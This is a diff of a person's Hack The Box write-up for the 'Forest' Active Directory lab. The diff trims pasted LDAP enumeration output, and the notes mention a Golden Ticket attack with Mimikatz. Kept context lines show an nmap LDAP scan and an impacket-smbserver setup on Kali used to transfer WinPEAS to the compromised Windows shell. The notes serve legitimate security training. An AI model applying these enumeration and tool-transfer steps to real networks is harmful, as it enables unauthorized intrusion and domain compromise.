@@ -52,81 +52,7 @@ Compromise Full DOmain + Golden Ticket Attack = Mimikatz or ticketer.py
             nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.161
                 DC=htb,DC=local
                 objectSid: 1-5-21-3072663084-364016917-1341370565
-
                 dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
-            |         objectClass: top
-            |         objectClass: group
-            |         cn: Enterprise Read-only Domain Controllers
-            |         description: Members of this group are Read-Only Domain Controllers in the enterprise
-            |         distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
-            |         instanceType: 4
-            |         whenCreated: 2019/09/18 10:53:23 UTC
-            |         whenChanged: 2019/09/18 10:53:23 UTC
-            |         uSNCreated: 12429
-            |         uSNChanged: 12431
-            |         name: Enterprise Read-only Domain Controllers
-            |         objectGUID: f9d71231-d92-740-b238-8480a1a03d3
-            |         objectSid: 1-5-21-3072663084-364016917-1341370565-498
-            |         sAMAccountName: Enterprise Read-only Domain Controllers
-            |         sAMAccountType: 268435456
-            |         groupType: -2147483640
-            |         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
-            |         isCriticalSystemObject: TRUE
-            |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
-            |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
-            |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
-            |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
-            |         dSCorePropagationData: 1601/01/01 00:00:00 UTC
-
-        |     dn: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
-        |         objectClass: top
-        |         objectClass: group
-        |         cn: Cloneable Domain Controllers
-        |         description: Members of this group that are domain controllers may be cloned.
-        |         distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
-        |         instanceType: 4
-        |         whenCreated: 2019/09/18 10:53:23 UTC
-        |         whenChanged: 2019/09/18 10:53:23 UTC
-        |         uSNCreated: 12440
-        |         uSNChanged: 12442
-        |         name: Cloneable Domain Controllers
-        |         objectGUID: d8693b95-c468-ea44-8748-dc45c26dd433
-        |         objectSid: 1-5-21-3072663084-364016917-1341370565-522
-        |         sAMAccountName: Cloneable Domain Controllers
-        |         sAMAccountType: 268435456
-        |         groupType: -2147483646
-        |         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
-        |         isCriticalSystemObject: TRUE
-        |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
-        |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
-        |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
-        |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
-        |         dSCorePropagationData: 1601/01/01 00:00:00 UTC
-
-             dn: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
-        |         objectClass: top
-        |         objectClass: group
-        |         cn: DnsUpdateProxy
-        |         description: DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
-        |         distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
-        |         instanceType: 4
-        |         whenCreated: 2019/09/18 10:54:03 UTC
-        |         whenChanged: 2019/09/18 10:54:03 UTC
-        |         uSNCreated: 12488
-        |         uSNChanged: 12488
-        |         name: DnsUpdateProxy
-        |         objectGUID: c2c7c95-4bea-8a45-a494-93df6f83979a
-        |         objectSid: 1-5-21-3072663084-364016917-1341370565-1102
-        |         sAMAccountName: DnsUpdateProxy
-        |         sAMAccountType: 268435456
-        |         groupType: -2147483646
-
-        |     dn: CN=Protected Users,CN=Users,DC=htb,DC=local
-        |         objectClass: top
-        |         objectClass: group
-        |         cn: Protected Users
-
-
                 ldapServiceName: htb.local:forest$@HTB.LOCAL
     |           serverName: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
 
@@ -255,7 +181,7 @@ Compromise Full DOmain + Golden Ticket Attack = Mimikatz or ticketer.py
     
     We have a shell we will navigate first
 
-    Because certutil doesn't work, we are in Powershell, We will create an smb server to download 'Winpeas' from Kali to windows machine:
+    Because certutil doesn't work, We will create an smb server to download 'Winpeas' from Kali to windows machine:
         on Kali:
             mkdir smb
             impacket-smbserver cool $(pwd) -smb2support -user admin -password admin
